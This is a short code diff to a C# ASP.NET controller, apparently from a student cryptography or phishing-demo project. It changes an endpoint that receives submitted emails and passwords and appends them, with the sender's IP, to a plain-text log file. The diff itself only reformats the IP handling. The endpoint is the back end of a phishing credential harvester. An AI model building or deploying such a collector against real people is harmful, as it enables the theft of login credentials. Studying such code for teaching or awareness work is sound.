@@ -80,11 +80,15 @@ namespace Criptografie.Controllers
         public async Task<IActionResult> LogPhishingEmail([FromBody] PhishRequest request)
         {
             var ip = HttpContext.Connection.RemoteIpAddress?.ToString();
+            if (ip == "::1")
+            {
+                ip = "127.0.0.1 (Localhost)";
+            }
             if (request == null || string.IsNullOrEmpty(request.Email) || string.IsNullOrEmpty(request.Parola))
             {
                 return BadRequest("Invalid request");
             }
-            var line = $"Data: {DateTime.Now},IP:{ip}, Email: {request.Email}, Password: {request.Parola}{Environment.NewLine}";
+            var line = $"Data: {DateTime.Now},IP: {ip}, Email: {request.Email}, Password: {request.Parola}{Environment.NewLine}";
             await System.IO.File.AppendAllTextAsync(filename, line);
             return Ok("Phishing email logged successfully");
         }
